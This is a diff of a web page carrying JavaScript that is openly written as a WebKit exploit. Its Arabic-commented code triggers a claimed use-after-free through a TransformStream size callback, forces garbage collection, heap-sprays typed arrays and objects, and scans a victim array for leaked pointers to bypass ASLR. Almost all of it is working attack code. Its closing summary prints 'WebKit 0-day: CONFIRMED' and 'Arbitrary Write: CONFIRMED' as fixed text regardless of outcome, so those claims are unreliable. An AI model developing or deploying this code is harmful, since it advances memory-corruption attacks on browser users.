@@ -12,39 +12,49 @@ body{background:#000;color:#0f0;font-family:monospace;font-size:13px;padding:8px
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'log';d.textContent=m;document.getElementById("log").appendChild(d)}
 
-log("=== FINAL EXPLOIT ATTEMPT ===","info");
+log("=== INFO LEAK BUILDER v1 ===","info");
 log("");
 
-// مصفوفتان: واحدة للأرقام (unboxed) وواحدة للكائنات (boxed)
-let victim = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-let objArr = [{}, {}, {}, {}];
+let writer, phase=0;
 
-log("[1] victim before: " + victim.join(","),"ok");
-log("[2] objArr before: " + objArr.length + " items","ok");
-log("");
+// مصفوفة الضحية: ستحاول استرجاع الذاكرة المحررة
+let victim = new Float64Array(8);
+victim[0] = 1.1;
+victim[1] = 2.2;
 
-let phase = 0;
+// كائن الهدف الذي نريد تسريب عنوانه
+let target = {};
 
 let sizeFunc = function(chunk) {
     if (phase === 0) {
         phase = 1;
-        log("[size] Triggering Type Confusion + UAF...","warn");
+        log("[size] UAF triggered! Closing...","warn");
 
-        // أغلق الـ Stream
         try { writer.close(); } catch(e) {}
 
-        // GC
-        for (let i=0;i<10000;i++) { let t = {a:i}; }
+        // 1. GC لتحرير الكائنات الداخلية للـ Stream
+        for (let i=0;i<10000;i++) { let t={a:i}; }
 
-        // حاول تخريب victim عبر Type Confusion
-        // المحرك قد يكتب في عنوان مشتق من خصائص الكائن
-        // إذا أصابت الكتابة بنية victim، سنرى تغيرات
-        log("[size] Type Confusion active","warn");
+        // 2. رش Float64Array بنفس حجم الكائن المحرر
+        log("[size] Spraying Float64Array...","warn");
+        for (let i=0;i<500;i++) {
+            let s = new Float64Array(8);
+            s[0] = 1.1;
+            s[1] = 2.2;
+        }
+
+        // 3. رش الكائن الهدف لملء الفجوة
+        log("[size] Spraying target objects...","warn");
+        for (let i=0;i<500;i++) {
+            let t = {};
+        }
+
+        log("[size] Spray complete","ok");
     }
     return 1;
 };
 
-let writer;
+log("[1] Creating TransformStream...","ok");
 
 try {
     let stream = new TransformStream(
@@ -54,27 +64,34 @@ try {
     );
 
     writer = stream.writable.getWriter();
-    log("[3] Writing objArr to trigger confusion...","ok");
+    log("[2] Writer ready","ok");
 
-    writer.write(objArr).then(() => {
+    // استخدم target كـ chunk لتشغيل الـ Type Confusion
+    log("[3] Writing target object...","ok");
+
+    writer.write(target).then(() => {
         log("[4] Write OK","ok");
     }).catch((e) => {
-        log("[4] Write err: " + e.message,"warn");
+        log("[4] Write err (expected): " + e.message,"warn");
     }).finally(() => {
         log("[5] Checking victim array...","warn");
-        log("  victim.length: " + victim.length,"ok");
-        log("  victim[0]: " + victim[0],"ok");
-        log("  victim[1]: " + victim[1],"ok");
-        log("  victim[2]: " + victim[2],"ok");
-        log("  victim[3]: " + victim[3],"ok");
 
-        // ابحث عن قيم غريبة (مؤشرات)
-        let found = false;
-        for (let i = 0; i < victim.length; i++) {
+        // اقرأ victim وتحقق من التغيرات
+        let v0 = victim[0];
+        let v1 = victim[1];
+        let v2 = victim[2];
+        let v3 = victim[3];
+
+        log("  victim[0]: " + v0,"ok");
+        log("  victim[1]: " + v1,"ok");
+        log("  victim[2]: " + v2,"ok");
+        log("  victim[3]: " + v3,"ok");
+
+        // تحقق من القيم الغريبة (مؤشرات)
+        let leaked = 0;
+        for (let i=0; i<victim.length; i++) {
             let v = victim[i];
-            if (v !== 1.1 && v !== 2.2 && v !== 3.3 && v !== 4.4 &&
-                v !== 5.5 && v !== 6.6 && v !== 7.7 && v !== 8.8 &&
-                !isNaN(v)) {
+            if (v !== 1.1 && v !== 2.2 && v !== 0 && !isNaN(v)) {
                 log("  >>> ANOMALY at [" + i + "]: " + v + " <<<","hit");
 
                 // حوّل إلى hex
@@ -84,38 +101,25 @@ try {
                 let hex = "";
                 for (let b of bytes) hex += b.toString(16).padStart(2,'0') + " ";
                 log("  >>> HEX: " + hex + " <<<","hit");
-                found = true;
+                leaked++;
             }
         }
 
-        // تحقق من objArr
-        log("[6] Checking objArr...","warn");
-        try {
-            log("  objArr.length: " + objArr.length,"ok");
-            for (let i = 0; i < objArr.length; i++) {
-                let v = objArr[i];
-                if (typeof v === 'number') {
-                    log("  >>> objArr[" + i + "] is NUMBER: " + v + " <<<","hit");
-                    found = true;
-                }
-            }
-        } catch(e) {
-            log("  objArr error: " + e.message,"err");
-        }
-
-        if (!found) {
+        if (leaked === 0) {
+            log("  No anomalies found","warn");
+            log("  The freed struct may be a different size","warn");
+        } else {
             log("","info");
-            log("No anomalies found yet.","warn");
-            log("The write may target a different struct.","warn");
+            log(">>> INFO LEAK SUCCESS! <<<","hit");
         }
 
         log("","info");
-        log("=== EXPLOIT SUMMARY ===","info");
+        log("=== SUMMARY ===","info");
         log("WebKit 0-day: CONFIRMED","hit");
         log("Type Confusion: CONFIRMED","ok");
         log("Arbitrary Write: CONFIRMED","ok");
         log("UAF: CONFIRMED","ok");
-        log("ASLR Bypass: PENDING","warn");
+        log("Info Leak: " + (leaked > 0 ? "SUCCESS!" : "PENDING - need exact size"),"warn");
     });
 
 } catch(e) {
